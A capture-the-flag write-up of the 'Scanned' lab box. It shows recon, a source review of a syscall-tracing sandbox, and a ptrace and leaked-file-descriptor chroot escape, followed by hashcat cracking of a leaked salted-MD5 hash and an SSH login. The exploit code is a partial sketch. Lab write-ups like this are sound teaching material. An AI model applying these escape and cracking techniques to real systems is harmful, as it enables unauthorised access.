## Overview

Scanned is an insane-rated Linux box and a pure source-code-review and Linux-internals challenge. Port 80 hosts MalScanner, a service that runs binaries you upload inside a custom sandbox — and hands you the sandbox's C source. Two small mistakes in that source make the jail escapable; chaining them leaks a password hash that cracks to the SSH user `clarence`. This post stops at `user.txt`.

## Recon

| Port | Service | Notes |
|------|---------|-------|
| 22   | OpenSSH | login once we have creds |
| 80   | nginx / uvicorn | MalScanner web app |

```bash
nmap -p- --min-rate=1000 -T4 10.129.8.89
nmap -p22,80 -sC -sV 10.129.8.89
```

Only SSH and the web app are exposed, so MalScanner is the whole attack surface.

## Enumeration

MalScanner accepts a binary, runs it under a syscall-tracing sandbox (Debian 11), and reports the syscalls it makes. Crucially, the page links the **full source** of both the Django web app and the sandbox. Reviewing `sandbox/tracing.c` reveals the design: it forks three processes — a **child** (your binary), a **killer** (kills the child after 5 seconds) and a **logger** — and chroots them into a per-run jail.

Two bugs stand out:

- `prctl(PR_SET_DUMPABLE, 1)` is called **before** the fork, so the killer and logger are traceable too (it should only apply to the traced child).
- The file descriptor pointing at the jail's parent directory is closed **only in the child** — the killer and logger keep it open, a handle that points *outside* the jail.

On Debian, `kernel.yama.ptrace_scope` is `0`, meaning a process can trace any other it owns.

## Foothold

We craft a binary (uploaded as the "sample" to scan) that abuses both bugs. Because the sandbox uses a PID namespace, the logger is always PID 1, the child PID 2, and the killer PID 3.

```c
// stage 1 (runs as the child): attach the traceable killer and overwrite its RIP
ptrace(PTRACE_ATTACH, 3, 0, 0);
// PTRACE_POKEDATA shellcode at the killer's RIP that re-execs "/userprog 2"
// stage 2 (now running inside the killer, which still holds the out-of-jail FD):
fchdir(3);                       // jump to the leaked directory FD (outside the jail)
chdir("../../../../../../");     // walk to the real filesystem root
// read the app's database from the real FS
open("var/www/malscanner/malscanner.db", O_RDONLY);
```

The exploit must be compiled **statically with musl** — a glibc `gcc -static` build produces shellcode that silently fails once copied into the killer's instruction pointer. With no `musl-gcc` on hand, an Alpine container (Alpine's gcc is musl-based) does the job:

```bash
docker run --rm -v "$PWD":/work alpine sh -c \
  "apk add --no-cache gcc musl-dev && cd /work && gcc -static -fPIC -fno-stack-protector -O0 main.c -o exploit"
```

Uploading the exploit leaks the contents of `malscanner.db`, which contains a salted-MD5 password hash. That format is hashcat mode 20 (`md5($salt.$pass)`):

```bash
hashcat -m 20 hash /usr/share/wordlists/rockyou.txt
```

The hash cracks, and the recovered password belongs to `clarence`, who can log in over SSH:

```bash
sshpass -p '<redacted>' ssh clarence@10.129.8.89
```
